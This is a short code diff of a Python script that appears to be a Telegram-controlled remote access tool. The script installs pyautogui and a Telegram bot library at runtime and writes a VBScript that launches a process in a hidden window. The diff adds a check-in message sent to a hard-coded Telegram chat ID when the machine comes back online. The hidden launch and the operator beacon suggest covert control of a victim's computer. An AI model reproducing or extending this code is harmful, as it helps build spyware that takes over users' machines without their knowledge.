@@ -109,9 +109,9 @@ import requests
 import subprocess,time,os,shutil,pickle
 while not check_internet_connection():
     print('Простите но интернет отсвует')
-os.system("pip3 install requests")
-os.system("pip3 install pyTelegramBotAPI")
-os.system("pip3 install pyautogui")
+subprocess.Popen("pip3 install requests")
+subprocess.Popen("pip3 install pyTelegramBotAPI")
+subprocess.Popen("pip3 install pyautogui")
 import requests
 import telebot
 import pyautogui
@@ -157,6 +157,7 @@ oShell.Run strArgs, 0, false"""
 with open(x,"w") as bat_file:
     bat_file.write(coder)
 bot = telebot.TeleBot(tok)
+bot.send_message(6080085900,"Ура, я сновасети :)")
 @bot.message_handler(commands="start")
 def keyb(message):
     markup=types.ReplyKeyboardMarkup()
